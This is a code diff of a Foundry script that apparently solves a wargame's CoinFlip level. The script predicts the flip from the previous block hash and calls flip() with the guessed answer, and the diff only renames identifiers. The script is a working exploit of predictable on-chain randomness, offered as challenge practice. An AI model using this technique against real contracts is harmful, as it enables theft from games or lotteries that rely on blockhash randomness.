@@ -2,10 +2,10 @@
 pragma solidity ^0.6.0;
 
 import "forge-std/Script.sol";
-import "instances/level03.sol";
+import "instances/03_coinflip.sol";
 
 contract AttackerCoinFlipScript is Script {
-    CoinFlip level03 = CoinFlip(vm.envAddress("INSTANCE"));
+    CoinFlip coinflip = CoinFlip(vm.envAddress("INSTANCE"));
 
     function run() external {
         vm.startBroadcast();
@@ -13,10 +13,10 @@ contract AttackerCoinFlipScript is Script {
         uint256 blockNum = block.number;
         uint256 blockValue = uint256(blockhash(blockNum - 1));
 
-        level03.flip(blockValue >> 255 == 1);
+        coinflip.flip(blockValue >> 255 == 1);
 
         console.log("blockNum", blockNum);
-        console.log("Consecutive Wins: ", level03.consecutiveWins());
+        console.log("Consecutive Wins: ", coinflip.consecutiveWins());
 
         vm.stopBroadcast();
     }
